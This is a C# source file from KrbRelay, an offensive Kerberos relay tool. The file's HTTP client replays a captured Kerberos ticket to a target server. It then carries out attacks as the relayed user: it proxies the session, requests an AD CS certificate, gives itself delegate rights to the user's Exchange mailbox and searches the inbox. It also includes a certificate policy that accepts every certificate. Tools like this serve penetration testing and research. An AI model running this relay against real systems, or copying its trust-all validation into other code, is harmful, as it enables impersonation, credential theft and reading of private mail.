using Org.BouncyCastle.X509;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using static KrbRelay.Program;

namespace KrbRelay.Clients
{
    public class Http
    {
        public static void Connect()
        {
            string endpoint = "";
            if (!string.IsNullOrEmpty(State.attacks["endpoint"]))
            {
                endpoint = State.attacks["endpoint"].TrimStart('/');
            }

            HttpResponseMessage result;
            var cookie = string.Format("Negotiate {0}", Convert.ToBase64String(State.ticket));

            using (var message = new HttpRequestMessage(HttpMethod.Get, endpoint))
            {
                message.Headers.Add("Authorization", cookie);
                message.Headers.Add("Connection", "keep-alive");
                message.Headers.Add(
                    "User-Agent",
                    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
                );
                result = httpClient.SendAsync(message).Result;
            }

            if (result.StatusCode != HttpStatusCode.Unauthorized)
            {
                Console.WriteLine("[+] HTTP session established");

                //Kerberos auth may not require set-cookies
                IEnumerable<string> cookies = null;
                foreach (var h in result.Headers)
                {
                    if (h.Key == "Set-Cookie")
                    {
                        cookies = h.Value;
                        Console.WriteLine(
                            "[*] Authentication Cookie;\n" + string.Join(";", h.Value)
                        );
                    }
                }

                try
                {
                    if (State.attacks.Keys.Contains("proxy"))
                    {
                        Attacks.Http.ProxyServer.Start(
                            httpClient,
                            httpClient.BaseAddress.ToString()
                        );
                    }

                    if (State.attacks.Keys.Contains("adcs"))
                    {
                        Attacks.Http.ADCS.requestCertificate(
                            httpClient,
                            State.relayedUser,
                            State.relayedUserDomain,
                            State.attacks["adcs"]
                        );
                    }

                    if (State.attacks.Keys.Contains("ews-delegate"))
                    {
                        Attacks.Http.EWS.delegateMailbox(
                            httpClient,
                            State.relayedUser,
                            State.attacks["ews-delegate"]
                        );
                    }

                    if (State.attacks.Keys.Contains("ews-search"))
                    {
                        Attacks.Http.EWS.readMailbox(
                            httpClient,
                            "inbox",
                            State.attacks["ews-search"]
                        );
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] {0}", e);
                }
            }
            else
            {
                foreach (var header in result.Headers)
                {
                    //Console.WriteLine(header.Key);
                    if (header.Key == "WWW-Authenticate")
                    {
                        State.UpdateApRep1(Convert.FromBase64String(
                            header.Value.First().Replace("Negotiate ", "")
                        ));
                    }
                }
            }
        }
    }

    internal class TrustAll : ICertificatePolicy
    {
        public TrustAll() { }

        public bool CheckValidationResult(
            ServicePoint srvPoint,
            X509Certificate certificate,
            WebRequest request,
            int certificateProblem
        )
        {
            return true;
        }

        public bool CheckValidationResult(
            ServicePoint srvPoint,
            System.Security.Cryptography.X509Certificates.X509Certificate certificate,
            WebRequest request,
            int certificateProblem
        )
        {
            return true;
        }
    }
}
